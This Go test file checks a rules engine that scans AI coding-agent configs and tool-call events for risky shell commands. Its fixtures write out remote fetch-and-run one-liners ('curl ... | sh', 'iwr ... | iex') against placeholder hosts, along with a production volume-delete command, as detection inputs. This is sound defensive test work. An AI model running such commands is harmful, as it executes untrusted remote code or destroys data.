package rules

import (
	"context"
	"encoding/json"
	"errors"
	"flag"
	"os"
	"slices"
	"strings"
	"testing"
	"time"

	"github.com/vgmartinez/tripcord/internal/model"
)

var update = flag.Bool("update", false, "rewrite golden files")

func compileT(t *testing.T, env *Env, src string) *Expr {
	t.Helper()
	x, err := env.Compile(src)
	if err != nil {
		t.Fatalf("compile %q: %v", src, err)
	}
	return x
}

const runOnFolderOpen = `has(task.runOptions) && has(task.runOptions.runOn) && task.runOptions.runOn == "folderOpen"`

func taskInput(t *testing.T, limits Limits, payload string) *Input {
	t.Helper()
	in, err := ConfigInput(model.ConfigItem{
		Harness: model.SurfaceVSCode, Scope: model.ScopeRepo, Path: ".vscode/tasks.json",
		Kind: model.ConfigKindTask, Payload: json.RawMessage(payload),
	}, limits)
	if err != nil {
		t.Fatal(err)
	}
	return in
}

func TestEvalVariables(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"label":"x","runOptions":{"runOn":"folderOpen"},"n":3}`)
	for src, want := range map[string]bool{
		runOnFolderOpen: true,
		`has(payload.label) && payload.label == "x"`:              true,
		`config.kind == "task"`:                                   true,
		`config.path.endsWith("tasks.json")`:                      true,
		`config.harness == "vscode"`:                              true,
		`has(payload.n) && payload.n == 3`:                        true,
		`has(payload.label) && payload.label.lowerAscii() == "x"`: true,
		`has(task.runOptions) && !has(task.x)`:                    true,
		`"runOptions" in task && "runOn" in task.runOptions && task.runOptions.runOn == "folderOpen"`:        true,
		`has(task.runOptions) && has(task.runOptions.runOn) ? task.runOptions.runOn == "folderOpen" : false`: true,
		`!has(payload.tools) || size(payload.tools) == 0`:                                                    true,
		`event.kind == "" && event.source.harness == "" && event.session.id == ""`:                           true,
		`has(task.missing) && has(task.missing.deep) && task.missing.deep == "a"`:                            false,
		`event.kind == "tool_call"`: false,
	} {
		got, err := compileT(t, env, src).Eval(context.Background(), in)
		if err != nil || got != want {
			t.Errorf("%s = %v, %v; want %v", src, got, err, want)
		}
	}
}

func TestTaskOnlyBoundForTaskItems(t *testing.T) {
	env := testEnv(t)
	in, err := ConfigInput(model.ConfigItem{
		Harness: model.HarnessClaude, Scope: model.ScopeRepo, Path: ".mcp.json",
		Kind: model.ConfigKindMCPServer, Payload: json.RawMessage(`{"runOptions":{"runOn":"folderOpen"}}`),
	}, env.Limits())
	if err != nil {
		t.Fatal(err)
	}
	got, err := compileT(t, env, runOnFolderOpen).Eval(context.Background(), in)
	if err != nil || got {
		t.Fatalf("got %v, %v", got, err)
	}
}

func TestEventInput(t *testing.T) {
	env := testEnv(t)
	ev := model.Event{
		Schema: model.SchemaEvent, ID: "evt_1", TS: time.Unix(0, 0).UTC(),
		Source:  model.Source{Harness: model.HarnessClaude, Surface: "cloud", Version: "1", Origin: "hook:PreToolUse"},
		Session: model.EventSession{ID: "s"}, Kind: model.EventKindToolCall, Tool: "shell",
		Command: "railway volume delete prod",
	}
	in, err := EventInput(ev, env.Limits())
	if err != nil {
		t.Fatal(err)
	}
	x := compileT(t, env, `event.kind == "tool_call" && event.tool == "shell" && event.command.matches("(?i)railway\\s+(volume|environment)\\s+delete") && event.source.harness == "claude"`)
	if got, err := x.Eval(context.Background(), in); err != nil || !got {
		t.Fatalf("got %v, %v", got, err)
	}
}

// TestEvalCostLimit checks that the cost limit, not the clock, stops an
// expensive evaluation under the default limits, so the outcome does not
// depend on how loaded the machine is.
func TestEvalCostLimit(t *testing.T) {
	limits := DefaultLimits()
	limits.EvalTimeout *= timingScale
	env, err := NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	items := make([]string, 6000)
	for i := range items {
		items[i] = "1"
	}
	in := taskInput(t, env.Limits(), `{"items":[`+strings.Join(items, ",")+`]}`)
	x := compileT(t, env, `has(payload.items) && payload.items.all(a, payload.items.all(b, a == b))`)
	start := time.Now()
	_, err = x.Eval(context.Background(), in)
	if !errors.Is(err, ErrCostLimit) {
		t.Fatalf("err = %v, want ErrCostLimit", err)
	}
	// The race detector makes this nested comprehension take tens of
	// seconds. ErrCostLimit is the assertion; this only checks that the
	// safety-net timeout, scaled the same way, did not elapse first.
	if d := time.Since(start); d > env.Limits().EvalTimeout {
		t.Fatalf("cost limit took %v, past the %v timeout", d, env.Limits().EvalTimeout)
	}
}

func TestEvalTimeout(t *testing.T) {
	limits := DefaultLimits()
	limits.CostLimit = 1 << 62
	limits.EvalTimeout = time.Millisecond
	env, err := NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	items := make([]string, 3000)
	for i := range items {
		items[i] = "1"
	}
	in := taskInput(t, limits, `{"items":[`+strings.Join(items, ",")+`]}`)
	x := compileT(t, env, `has(payload.items) && payload.items.all(a, payload.items.all(b, a == b))`)
	start := time.Now()
	if _, err := x.Eval(context.Background(), in); !errors.Is(err, ErrTimeout) {
		t.Fatalf("err = %v, want ErrTimeout", err)
	}
	if d := time.Since(start); d > 500*time.Millisecond {
		t.Fatalf("timeout took %v", d)
	}
}

// TestHookLimits checks that the hook path is bounded by counted cost
// and input size, with the clock only as a safety net: the spec's hook
// target is 25 ms at p95 for the whole hook.
func TestHookLimits(t *testing.T) {
	l := HookLimits()
	if l.CostLimit == 0 || l.CostLimit > DefaultLimits().CostLimit || l.EvalTimeout < time.Second || l.Budget < l.EvalTimeout {
		t.Fatalf("hook limits %+v", l)
	}
	if l.MaxInputBytes != HookMaxInputBytes || HookMaxInputBytes != 4<<20 {
		t.Fatalf("hook input cap %d", l.MaxInputBytes)
	}
	if d := DefaultLimits(); d.Budget != 0 || d.EvalTimeout < time.Second {
		t.Fatalf("scan limits %+v", d)
	}
}

// TestHookWorstCaseRegex bounds the uninterruptible case: one matches()
// over an input at the hook cap. The timeout cannot stop it, so the cap
// must keep it under the per-evaluation timeout, far inside the hook's
// deadline. At the 4 MiB cap it measures about 230 ms. The fastest of
// five runs is compared, so a run descheduled by a loaded machine does
// not fail the test, while a regex that is really slow still does.
func TestHookWorstCaseRegex(t *testing.T) {
	env, err := NewEnv(HookLimits())
	if err != nil {
		t.Fatal(err)
	}
	cmd := strings.Repeat("a", HookMaxInputBytes-200)
	ev := model.Event{Schema: model.SchemaEvent, ID: "e", Command: cmd}
	in, err := EventInput(ev, env.Limits())
	if err != nil {
		t.Fatal(err)
	}
	x := compileT(t, env, `event.command.matches("(a|aa)*(b|c|d)$")`)
	fastest := time.Duration(1<<63 - 1)
	for range 5 {
		start := time.Now()
		_, _ = x.Eval(context.Background(), in)
		fastest = min(fastest, time.Since(start))
	}
	if fastest > HookEvalTimeout*timingScale {
		t.Fatalf("worst-case regex at the hook cap took %v (fastest of 5 runs)", fastest)
	}
	ev.Command = strings.Repeat("a", HookMaxInputBytes)
	if _, err := EventInput(ev, env.Limits()); !errors.Is(err, ErrInputLimit) {
		t.Fatalf("err = %v, want ErrInputLimit", err)
	}
	ev.Command = strings.Repeat("<&>", (HookMaxInputBytes-200)/3)
	if _, err := EventInput(ev, env.Limits()); err != nil {
		t.Fatalf("HTML characters counted escaped: %v", err)
	}
}

func TestBudget(t *testing.T) {
	limits := DefaultLimits()
	limits.Budget = time.Millisecond
	env, err := NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	in := taskInput(t, limits, `{}`)
	x := compileT(t, env, `true`)
	ctx, cancel := limits.WithBudget(context.Background())
	defer cancel()
	<-ctx.Done()
	if _, err := x.Eval(ctx, in); !errors.Is(err, ErrBudget) {
		t.Fatalf("err = %v, want ErrBudget", err)
	}
	ctx, cancel = context.WithCancel(context.Background())
	cancel()
	if _, err := x.Eval(ctx, in); !errors.Is(err, context.Canceled) {
		t.Fatalf("err = %v, want context.Canceled", err)
	}
}

// TestMissingKeyIsFalse pins the Eval fallback that the guard check
// exists for: an unguarded read of a missing field makes the whole
// expression false, even under a negation.
func TestMissingKeyIsFalse(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"list":[]}`)
	for _, src := range []string{
		`task.missing.deep == "a"`,
		`!(task.missing.deep == "a")`,
		`payload.list[3] == 1`,
	} {
		x, err := env.compile(src, false)
		if err != nil {
			t.Fatal(err)
		}
		if got, err := x.Eval(context.Background(), in); err != nil || got {
			t.Errorf("%s = %v, %v", src, got, err)
		}
		if _, err := env.Compile(src); err == nil {
			t.Errorf("%s compiled without a guard", src)
		}
	}
}

func TestEventInputFillsOptionalFields(t *testing.T) {
	env := testEnv(t)
	in, err := EventInput(model.Event{Schema: model.SchemaEvent, ID: "e", Kind: model.EventKindToolCall}, env.Limits())
	if err != nil {
		t.Fatal(err)
	}
	x := compileT(t, env, `event.tool == "" && event.command == "" && event.source.surface == "" && event.session.repo == "" && config.kind == ""`)
	if got, err := x.Eval(context.Background(), in); err != nil || !got {
		t.Fatalf("got %v, %v", got, err)
	}
	// A fully populated event has no fields outside eventFields.
	full := model.Event{
		Schema: model.SchemaEvent, ID: "e", TS: time.Unix(1, 0), Kind: model.EventKindToolCall,
		Source:  model.Source{Harness: model.HarnessClaude, Surface: "s", Version: "v", Origin: "o"},
		Session: model.EventSession{ID: "s", Repo: "r", Branch: "b", Actor: "a"},
		Tool:    "t", Command: "c", RawRef: "r",
	}
	raw, err := json.Marshal(full)
	if err != nil {
		t.Fatal(err)
	}
	var m map[string]any
	if err := json.Unmarshal(raw, &m); err != nil {
		t.Fatal(err)
	}
	var paths []string
	for k, v := range m {
		paths = append(paths, k)
		if sub, ok := v.(map[string]any); ok {
			for sk := range sub {
				paths = append(paths, k+"."+sk)
			}
		}
	}
	slices.Sort(paths)
	want := slices.Sorted(slices.Values(eventFields))
	if !slices.Equal(paths, want) {
		t.Fatalf("event paths %v, eventFields %v", paths, want)
	}
}

func TestEvalNotBool(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"flag":"yes"}`)
	// dyn == bool type-checks, but a dyn value used as the whole result does not.
	if _, err := env.Compile(`payload.flag`); err == nil {
		t.Fatal("dyn result compiled")
	}
	x := compileT(t, env, `has(payload.flag) && (payload.flag == true || payload.flag == "yes")`)
	if got, err := x.Eval(context.Background(), in); err != nil || !got {
		t.Fatalf("got %v, %v", got, err)
	}
}

func TestEvalRuntimeErrorIsError(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"n":"text"}`)
	if _, err := compileT(t, env, `has(payload.n) && payload.n > 3`).Eval(context.Background(), in); err == nil {
		t.Fatal("type error was not reported")
	}
	if _, err := compileT(t, env, `has(payload.n) && payload.n.matches(payload.n + "(")`).Eval(context.Background(), in); err == nil {
		t.Fatal("bad runtime regex was not reported")
	}
}

func TestCompileExpressionLimit(t *testing.T) {
	env := testEnv(t)
	src := `payload.a == "` + strings.Repeat("x", env.Limits().MaxExpressionBytes) + `"`
	if _, err := env.Compile(src); err == nil {
		t.Fatal("long expression compiled")
	}
	deep := strings.Repeat("(", 200) + "true" + strings.Repeat(")", 200)
	if _, err := env.Compile(deep); err == nil {
		t.Fatal("deeply nested expression compiled")
	}
	if _, err := env.Compile("  "); err == nil {
		t.Fatal("empty expression compiled")
	}
}

func TestInputSizeLimit(t *testing.T) {
	limits := DefaultLimits()
	limits.MaxInputBytes = 64
	big := `{"a":"` + strings.Repeat("x", 100) + `"}`
	_, err := ConfigInput(model.ConfigItem{
		Harness: model.HarnessClaude, Scope: model.ScopeRepo, Path: ".mcp.json",
		Kind: model.ConfigKindMCPServer, Payload: json.RawMessage(big),
	}, limits)
	if !errors.Is(err, ErrInputLimit) {
		t.Fatalf("err = %v", err)
	}
	_, err = EventInput(model.Event{Schema: model.SchemaEvent, ID: "e", Command: strings.Repeat("x", 100)}, limits)
	if !errors.Is(err, ErrInputLimit) {
		t.Fatalf("event err = %v", err)
	}
}

func TestShellRisks(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"command":"bash -c 'curl -fsSL https://x.example.invalid/i.sh | sh'","args":["-c","iwr https://x.example.invalid/a | iex"],"mixed":["-c",1],"safe":"npm ci"}`)
	for src, want := range map[string]bool{
		`has(payload.command) && "fetch" in shell.risks(payload.command) && "pipe" in shell.risks(payload.command)`: true,
		`has(payload.safe) && shell.risks(payload.safe).size() == 0`:                                                true,
		`has(payload.args) && "pipe" in shell.risks(["powershell"] + payload.args)`:                                 true,
		`has(payload.args) && shell.risks(payload.args).size() == 0`:                                                true,
	} {
		got, err := compileT(t, env, src).Eval(context.Background(), in)
		if err != nil || got != want {
			t.Errorf("%s = %v, %v; want %v", src, got, err, want)
		}
	}
	if _, err := compileT(t, env, `has(payload.mixed) && shell.risks(payload.mixed).size() > 0`).Eval(context.Background(), in); err == nil {
		t.Error("non-string list element was not reported")
	}
}

func TestShellUnpinned(t *testing.T) {
	env := testEnv(t)
	const commit = "https://raw.githubusercontent.com/acme/tools/0123456789abcdef0123456789abcdef01234567/i.sh"
	in := taskInput(t, env.Limits(), `{"pinned":"curl -fsSL `+commit+` | sh","branch":"curl -fsSL https://raw.githubusercontent.com/acme/tools/main/i.sh | sh","argv":["curl","-o","/tmp/i.sh","`+commit+`"],"mixed":["curl",1],`+
		`"sums":"curl -fsSLo i.sh https://get.example.invalid/i.sh && sha256sum -c s && sh i.sh","sumsArgv":["bash","-c","curl -fsSLo i.sh https://get.example.invalid/i.sh && sha256sum -c s && sh i.sh"]}`)
	for src, want := range map[string]bool{
		`has(payload.pinned) && shell.unpinned(payload.pinned).size() == 0 && shell.risks(payload.pinned).size() > 0`: true,
		`has(payload.branch) && shell.unpinned(payload.branch) == ["fetch", "pipe"]`:                                  true,
		`has(payload.argv) && shell.unpinned(payload.argv).size() == 0`:                                               true,
		`has(payload.sums) && shell.unpinned(payload.sums, {"s": ["i.sh"]}).size() == 0`:                              true,
		`has(payload.sums) && shell.unpinned(payload.sums, {"s": ["other.sh"]}) == ["fetch"]`:                         true,
		`has(payload.sums) && shell.unpinned(payload.sums) == ["fetch"]`:                                              true,
		`has(payload.sumsArgv) && shell.unpinned(payload.sumsArgv, {"s": ["i.sh"]}).size() == 0`:                      true,
		`has(payload.sumsArgv) && shell.unpinned(payload.sumsArgv, {}) == ["fetch"]`:                                  true,
		`has(payload.sums) && shell.unpinned(payload.sums, {"s": ["i.sh"]}, ["i.sh"]) == ["fetch"]`:                   true,
		`has(payload.sumsArgv) && shell.unpinned(payload.sumsArgv, {"s": ["i.sh"]}, ["i.sh"]) == ["fetch"]`:           true,
	} {
		got, err := compileT(t, env, src).Eval(context.Background(), in)
		if err != nil || got != want {
			t.Errorf("%s = %v, %v; want %v", src, got, err, want)
		}
	}
	if _, err := compileT(t, env, `has(payload.mixed) && shell.unpinned(payload.mixed).size() > 0`).Eval(context.Background(), in); err == nil {
		t.Error("non-string list element was not reported")
	}
}

func TestShellLocations(t *testing.T) {
	env := testEnv(t)
	in := taskInput(t, env.Limits(), `{"command":"bash -c '~/.x/run.sh && /tmp/y.sh'","exec":"/srv/hooks/check","args":["../x.sh"],"mixed":["sh",1],"safe":"\"$CLAUDE_PROJECT_DIR\"/.claude/hooks/x.sh"}`)
	for src, want := range map[string]bool{
		`has(payload.command) && shell.locations(payload.command) == ["home", "temp"]`: true,
		`has(payload.safe) && shell.locations(payload.safe).size() == 0`:               true,
		`has(payload.exec) && "absolute" in shell.locations(payload.exec)`:             true,
		`has(payload.args) && shell.locations(["bash"] + payload.args) == ["parent"]`:  true,
	} {
		got, err := compileT(t, env, src).Eval(context.Background(), in)
		if err != nil || got != want {
			t.Errorf("%s = %v, %v; want %v", src, got, err, want)
		}
	}
	if _, err := compileT(t, env, `has(payload.mixed) && shell.locations(payload.mixed).size() > 0`).Eval(context.Background(), in); err == nil {
		t.Error("non-string list element was not reported")
	}
}

func TestHookCommands(t *testing.T) {
	env := testEnv(t)
	for payload, want := range map[string]map[string]bool{
		`{"command":"a.sh","bash":"b.sh","powershell":1,"osx":"c.sh","args":["x"]}`: {
			`hook.commands(payload) == ["a.sh", "b.sh", "c.sh"]`: true,
			`hook.args(payload) == ["x"]`:                        true,
			`hook.argv(payload) == ["a.sh", "x"]`:                true,
		},
		`{"exec":"node","command":"ignored","args":["/tmp/x.js"]}`: {
			`hook.argv(payload) == ["node", "/tmp/x.js"]`:     true,
			`shell.locations(hook.argv(payload)) == ["temp"]`: true,
		},
		`{"args":["x.sh", 1, 2.5, true],"url":"https://x.invalid"}`: {
			`hook.commands(payload).size() == 0`:                     true,
			`hook.argv(payload) == ["", "x.sh", "1", "2.5", "true"]`: true,
		},
		`{"exec":"bash","args":["/tmp/x.sh",1]}`: {
			`hook.args(payload) == ["/tmp/x.sh", "1"]`:         true,
			`hook.argv(payload) == ["bash", "/tmp/x.sh", "1"]`: true,
			`shell.locations(hook.argv(payload)) == ["temp"]`:  true,
		},
		`{"exec":"bash"}`: {
			`hook.argv(payload).size() == 0`: true,
		},
	} {
		in := taskInput(t, env.Limits(), payload)
		for src, w := range want {
			got, err := compileT(t, env, src).Eval(context.Background(), in)
			if err != nil || got != w {
				t.Errorf("%s on %s = %v, %v; want %v", src, payload, got, err, w)
			}
		}
	}
}

// TestHookArgsUnreadable checks that hook.argv preserves scalar arguments,
// makes an object opaque, and recursively coerces an array. Null, or args
// that is not a list, stays fatal.
func TestHookArgsUnreadable(t *testing.T) {
	env := testEnv(t)
	for _, payload := range []string{
		`{"exec":"bash","args":["argvsecret.sh",{"a":1}]}`,
		`{"exec":"bash","args":["argvsecret.sh",["b"]]}`,
	} {
		got, err := compileT(t, env, `hook.args(payload).exists(a, a == "argvsecret.sh")`).Eval(context.Background(), taskInput(t, env.Limits(), payload))
		if err != nil || got != strings.Contains(payload, "argvsecret.sh") {
			t.Errorf("%s: got %v, err = %v", payload, got, err)
		}
	}
	for _, payload := range []string{
		`{"exec":"bash","args":"argvsecret.sh"}`,
		`{"exec":"bash","args":{"argvsecret":1}}`,
		`{"exec":"bash","args":null}`,
		`{"exec":"bash","args":["argvsecret.sh",null]}`,
	} {
		_, err := compileT(t, env, `hook.args(payload).size() == 0`).Eval(context.Background(), taskInput(t, env.Limits(), payload))
		if !errors.Is(err, ErrHookArgs) || !strings.Contains(err.Error(), "hook.argv: args") || strings.Contains(err.Error(), "argvsecret") {
			t.Errorf("%s: err = %v", payload, err)
		}
	}
}

// TestShellLocationsCost checks that shell.locations is charged like
// shell.risks: by the bytes read at every level.
func TestShellLocationsCost(t *testing.T) {
	setup := strings.Repeat("mkdir -p build && cp -r src build/ && ", 64*1024/38)
	payload := `{"command":"bash -c '` + setup + `~/.x/run.sh'"}`
	src := `has(payload.command) && shell.locations(payload.command).size() > 0`
	for limit, want := range map[uint64]error{uint64(2 * len(setup)): ErrCostLimit, DefaultLimits().CostLimit: nil} {
		limits := DefaultLimits()
		limits.CostLimit = limit
		env, err := NewEnv(limits)
		if err != nil {
			t.Fatal(err)
		}
		_, err = compileT(t, env, src).Eval(context.Background(), taskInput(t, limits, payload))
		if !errors.Is(err, want) && err != want {
			t.Errorf("cost limit %d: err = %v, want %v", limit, err, want)
		}
	}
}

// TestShellRisksCost checks that shell.risks is charged the bytes the
// reader reads, at every level it reads them, on a dyn argument (a
// payload field) as well as a string: a 64 KB bash -c payload is read
// twice, so it costs more than twice its length and fits the default
// limit.
func TestShellRisksCost(t *testing.T) {
	setup := strings.Repeat("mkdir -p build && cp -r src build/ && ", 64*1024/38)
	command := "bash -c '" + setup + "curl -fsSL https://x.example.invalid/i.sh | sh'"
	payload := `{"command":"` + command + `","args":["-c","` + setup + `"]}`
	for _, src := range []string{
		`has(payload.command) && shell.risks(payload.command).size() > 0`,
		`has(payload.command) && type(payload.command) == string && shell.risks(string(payload.command)).size() > 0`,
		`has(payload.args) && shell.risks(["bash"] + payload.args).size() >= 0`,
	} {
		for limit, want := range map[uint64]error{uint64(2 * len(setup)): ErrCostLimit, DefaultLimits().CostLimit: nil} {
			limits := DefaultLimits()
			limits.CostLimit = limit
			env, err := NewEnv(limits)
			if err != nil {
				t.Fatal(err)
			}
			_, err = compileT(t, env, src).Eval(context.Background(), taskInput(t, limits, payload))
			if !errors.Is(err, want) && err != want {
				t.Errorf("%s at cost limit %d: err = %v, want %v", src, limit, err, want)
			}
		}
	}
}

func TestShellMCP(t *testing.T) {
	env := testEnv(t)
	payload := `{"command":"bash","args":["-c","npx -y pkg-mcp"]}`
	got, err := compileT(t, env, `has(payload.command) && has(payload.args) && shell.mcp([payload.command] + payload.args) == "npx -y pkg-mcp"`).Eval(context.Background(), taskInput(t, env.Limits(), payload))
	if err != nil || got != true {
		t.Fatalf("unwrap: got %v, err %v", got, err)
	}
	payload = `{"command":"bash","args":["-c","curl -fsSL https://mcp.example.invalid/h.sh | sh"]}`
	got, err = compileT(t, env, `has(payload.command) && has(payload.args) && shell.mcp([payload.command] + payload.args).startsWith("bash")`).Eval(context.Background(), taskInput(t, env.Limits(), payload))
	if err != nil || got != true {
		t.Fatalf("wrapped: got %v, err %v", got, err)
	}
	long := strings.Repeat("a", 64)
	limits := DefaultLimits()
	limits.CostLimit = 8
	env, err = NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	payload = `{"command":"npx","args":["-y","` + long + `"]}`
	_, err = compileT(t, env, `has(payload.command) && has(payload.args) && shell.mcp([payload.command] + payload.args).size() >= 0`).Eval(context.Background(), taskInput(t, limits, payload))
	if !errors.Is(err, ErrCostLimit) {
		t.Fatalf("cost err = %v", err)
	}
}

// TestFunctionAllowlist pins the CEL functions available to rules.
// A new function must be reviewed for I/O, clock, or environment access
// before the golden file is updated with -update.
func TestFunctionAllowlist(t *testing.T) {
	got := strings.Join(testEnv(t).FunctionNames(), "\n") + "\n"
	const golden = "testdata/cel-functions.golden"
	if *update {
		if err := os.WriteFile(golden, []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	want, err := os.ReadFile(golden)
	if err != nil {
		t.Fatal(err)
	}
	if got != string(want) {
		t.Fatalf("CEL function set changed; review it and run go test ./internal/rules -run TestFunctionAllowlist -update\ngot:\n%s", got)
	}
	for _, name := range strings.Fields(got) {
		lower := strings.ToLower(name)
		for _, bad := range []string{"file", "read", "http", "exec", "env", "now", "net"} {
			if strings.Contains(lower, bad) {
				t.Errorf("function %q looks like I/O", name)
			}
		}
	}
}

func TestMCPVulnsCostAndArgs(t *testing.T) {
	args := make([]string, 0, 1000)
	for i := 0; i < 1000; i++ {
		args = append(args, "pkg")
	}
	raw, err := json.Marshal(map[string]any{"command": "npx", "args": args})
	if err != nil {
		t.Fatal(err)
	}
	limits := DefaultLimits()
	env, err := NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	in, err := ConfigInput(model.ConfigItem{
		Harness: model.HarnessClaude,
		Scope:   model.ScopeRepo,
		Path:    ".mcp.json",
		Kind:    model.ConfigKindMCPServer,
		Payload: raw,
	}, limits)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := compileT(t, env, `mcp.vulns(payload).size() >= 0`).Eval(context.Background(), in); err != nil {
		t.Fatal(err)
	}
	limits.CostLimit = 8
	env, err = NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	long := strings.Repeat("a", 64)
	raw, err = json.Marshal(map[string]any{"command": "npx", "args": []string{"-y", "pkg@" + long}})
	if err != nil {
		t.Fatal(err)
	}
	in, err = ConfigInput(model.ConfigItem{
		Harness: model.HarnessClaude,
		Scope:   model.ScopeRepo,
		Path:    ".mcp.json",
		Kind:    model.ConfigKindMCPServer,
		Payload: raw,
	}, limits)
	if err != nil {
		t.Fatal(err)
	}
	_, err = compileT(t, env, `mcp.vulns(payload).size() >= 0`).Eval(context.Background(), in)
	if !errors.Is(err, ErrCostLimit) {
		t.Fatalf("cost err = %v", err)
	}
	raw, err = json.Marshal(map[string]any{"command": "npx", "args": []any{"-y", map[string]any{"pkg": "x"}}})
	if err != nil {
		t.Fatal(err)
	}
	limits = DefaultLimits()
	env, err = NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	in, err = ConfigInput(model.ConfigItem{
		Harness: model.HarnessClaude,
		Scope:   model.ScopeRepo,
		Path:    ".mcp.json",
		Kind:    model.ConfigKindMCPServer,
		Payload: raw,
	}, limits)
	if err != nil {
		t.Fatal(err)
	}
	_, err = compileT(t, env, `mcp.vulns(payload).size() >= 0`).Eval(context.Background(), in)
	if err != nil {
		t.Fatalf("object arg err = %v", err)
	}
}

func TestMCPCommandArrayFollowsHarnessSchema(t *testing.T) {
	t.Parallel()
	raw, err := json.Marshal(map[string]any{"command": []any{"npx", "-y", "figma-developer-mcp@0.6.2"}})
	if err != nil {
		t.Fatal(err)
	}
	limits := DefaultLimits()
	env, err := NewEnv(limits)
	if err != nil {
		t.Fatal(err)
	}
	expr := compileT(t, env, `mcp.packages(payload).size() > 0`)
	for _, tc := range []struct {
		harness model.Harness
		want    bool
	}{
		{model.HarnessOpenCode, true},
		{model.HarnessClaude, false},
		{model.HarnessCursor, false},
		{model.SurfaceVSCode, false},
		{model.HarnessGemini, false},
		{model.HarnessCodex, false},
		{model.HarnessCopilot, false},
		{model.HarnessWindsurf, false},
	} {
		in, err := ConfigInput(model.ConfigItem{
			Harness: tc.harness,
			Scope:   model.ScopeRepo,
			Path:    ".mcp.json",
			Kind:    model.ConfigKindMCPServer,
			Payload: raw,
		}, limits)
		if err != nil {
			t.Fatal(err)
		}
		got, err := expr.Eval(context.Background(), in)
		if err != nil || got != tc.want {
			t.Fatalf("%s: got %v err %v, want %v", tc.harness, got, err, tc.want)
		}
	}
}
